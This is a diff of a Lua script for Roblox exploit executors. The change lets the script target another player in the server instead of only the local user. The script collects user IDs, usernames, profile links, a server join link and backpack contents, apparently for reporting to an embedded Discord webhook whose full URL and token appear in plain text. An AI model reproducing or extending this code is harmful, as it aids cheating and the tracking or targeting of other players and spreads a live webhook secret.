@@ -1,17 +1,36 @@
 task.defer(function()
+    local targetPlayerName = "me" -- use "me" or any username
     repeat task.wait() until game:IsLoaded()
 
     local Players = game:GetService("Players")
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local HttpService = game:GetService("HttpService")
-	local req = (http_request or request or syn and syn.request or fluxus and fluxus.request or getgenv().request or solara and solara.request)
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local req = (http_request or request or syn and syn.request or fluxus and fluxus.request or getgenv().request or solara and solara.request)
 
-	local LocalPlayer = Players.LocalPlayer
-	local UserId = LocalPlayer.UserId
-	local DisplayName = LocalPlayer.DisplayName
-	local Username = LocalPlayer.Name
-	local ProfileURL = string.format("https://www.roblox.com/users/%d/profile", UserId)
-	local GameLink = string.format("https://www.roblox.com/games/%d?jobId=%s", game.PlaceId, game.JobId)
+    local LocalPlayer = Players.LocalPlayer
+    local TargetPlayer
+
+    -- ✅ Get TargetPlayer
+    if targetPlayerName == "me" then
+        TargetPlayer = LocalPlayer
+    else
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name == targetPlayerName or p.DisplayName == targetPlayerName then
+                TargetPlayer = p
+                break
+            end
+        end
+        if not TargetPlayer then
+            warn("❌ Target player not found: " .. tostring(targetPlayerName))
+            return
+        end
+    end
+
+    local UserId = TargetPlayer.UserId
+    local DisplayName = TargetPlayer.DisplayName
+    local Username = TargetPlayer.Name
+    local ProfileURL = string.format("https://www.roblox.com/users/%d/profile", UserId)
+    local GameLink = string.format("https://www.roblox.com/games/%d?jobId=%s", game.PlaceId, game.JobId)
 
 	local webhook = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"
 
@@ -28,7 +47,25 @@ task.defer(function()
 	end
 
 	repeat task.wait() until LocalPlayer:FindFirstChild("Backpack")
-	local Backpack = LocalPlayer:WaitForChild("Backpack")
+	local TargetPlayer = nil
+
+    if targetPlayerName == "me" then
+    	TargetPlayer = Players.LocalPlayer
+    else
+    	for _, p in pairs(Players:GetPlayers()) do
+    		if p.Name == targetPlayerName or p.DisplayName == targetPlayerName then
+    			TargetPlayer = p
+    			break
+    		end
+    	end
+    
+    	if not TargetPlayer then
+    		warn("❌ Target player not found: " .. targetPlayerName)
+    		return
+    	end
+    end
+    
+    local Backpack = TargetPlayer:WaitForChild("Backpack")
 
 	local Item_Module = waitForModule(ReplicatedStorage:WaitForChild("Item_Module"))
 	local MutationHandler = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("MutationHandler"))
